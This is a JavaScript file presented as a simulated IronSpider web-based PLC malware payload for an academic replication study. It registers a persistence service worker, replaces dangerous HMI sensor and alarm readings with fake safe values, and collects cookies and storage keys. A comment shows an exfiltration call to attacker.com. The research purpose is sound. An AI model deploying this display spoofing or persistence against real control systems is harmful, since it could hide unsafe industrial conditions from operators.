// malware.js — Simulated IronSpider WB Malware Payload
// Research/Educational: NDSS 2024 replication study
// "Compromising Industrial Processes using Web-Based PLC Malware" (Pickren et al.)
//
// This file simulates the three main attack capabilities described in the paper:
//   1. Resurrection SW registration  (Section IV-C)
//   2. Display spoofing              (Section IV-A — hide dangerous sensor readings)
//   3. Credential exfiltration       (Section IV-B — log session data, simulated)
//
// NO real network calls to external hosts are made. All effects are local.

(function IronSpiderSimulation() {
  'use strict';
  console.log('[MALWARE] IronSpider simulation payload loaded and executing');

  // ── Phase 1: Register Resurrection Service Worker ──────────────────────────
  // In real IronSpider: the SW is registered from within the compromised PLC
  // web page immediately after initial infection via the CVE chain.
  // The SW then survives deletion of this file and can re-upload it.
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
      .then(reg => {
        console.log('[MALWARE] resurrection SW registered — scope:', reg.scope);
        window.dispatchEvent(new CustomEvent('malware-sw-registered', {
          detail: { scope: reg.scope, state: reg.installing ? 'installing' : 'active' }
        }));
      })
      .catch(err => console.error('[MALWARE] SW registration failed:', err.message));

    // Relay SW resurrection events to the page's event listeners
    navigator.serviceWorker.addEventListener('message', event => {
      const data = event.data || {};
      if (data.type === 'RESURRECTED') {
        window.dispatchEvent(new CustomEvent('malware-resurrected', {
          detail: { timestamp: data.timestamp }
        }));
      }
    });
  }

  // ── Phase 2: Display Spoofing ───────────────────────────────────────────────
  // The malware overwrites sensor display values with fabricated "safe" readings.
  // In real IronSpider: the WebVisu HMI is overwritten to render false values.
  // The operator sees NORMAL conditions while dangerous states go undetected.
  //
  // Spoofed values (what the operator sees):
  //   Pump Pressure  : 142 PSI  (real: 187 PSI — CRITICAL HIGH)
  //   Water Level    : 72%      (real: 94% — dangerously full)
  //   Chlorine       : 1.8 ppm  (real: 0.07 ppm — CRITICALLY LOW)
  //   Flow Rate      : 450 L/min (real: 850 L/min — HIGH)

  const SPOOFED = {
    'sensor-pressure': { display: '142 PSI',     unit: 'PSI' },
    'sensor-level':    { display: '72%',          unit: '%'   },
    'sensor-chlorine': { display: '1.8 ppm',      unit: 'ppm' },
    'sensor-flow':     { display: '450 L/min',    unit: 'L/min' },
  };

  function applySpoofing() {
    Object.entries(SPOOFED).forEach(([id, fake]) => {
      const el = document.getElementById(id);
      if (!el) return;
      if (!el.dataset.realValue) {
        el.dataset.realValue = el.textContent; // preserve real value
      }
      el.textContent      = fake.display;
      el.className        = 'sensor-value spoofed';
      el.style.color      = '#2ecc71'; // green → "safe"
      el.style.fontWeight = 'bold';
    });

    // Suppress all alarm indicators
    document.querySelectorAll('.alarm-cell').forEach(el => {
      if (!el.dataset.realClass) el.dataset.realClass = el.className;
      if (!el.dataset.realText)  el.dataset.realText  = el.textContent;
      el.textContent = 'OK';
      el.className   = 'alarm-cell alarm-ok';
    });

    // Update infection banner
    const banner = document.getElementById('infection-banner');
    if (banner) {
      banner.style.display     = 'block';
      banner.style.background  = '#c0392b';
      banner.textContent       = '\u26a0 INFECTED — IronSpider display spoofing active';
    }

    console.log('[MALWARE] display spoofing applied — dangerous readings hidden from operator');
  }

  // Apply after DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', applySpoofing);
  } else {
    applySpoofing();
  }

  // ── Phase 3: Credential / State Exfiltration (simulated) ───────────────────
  // In real IronSpider: exfiltrates session tokens, control program state,
  // sensor logs to an attacker-controlled server.
  // Here: we log the data locally to demonstrate the capability exists.
  function simulateExfiltration() {
    const exfil = {
      sessionCookie:    document.cookie         || '(empty)',
      localStorageKeys: Object.keys(localStorage),
      plcTitle:         document.title,
      url:              location.href,
      timestamp:        new Date().toISOString(),
    };
    console.log('[MALWARE] simulated exfiltration payload:', JSON.stringify(exfil, null, 2));
    // Real IronSpider would: await fetch('https://attacker.com/exfil', { method:'POST', body: ... })
  }
  setTimeout(simulateExfiltration, 300);

  // ── Signal: malware is active ───────────────────────────────────────────────
  window.dispatchEvent(new CustomEvent('malware-active'));
  console.log('[MALWARE] all phases complete');
})();
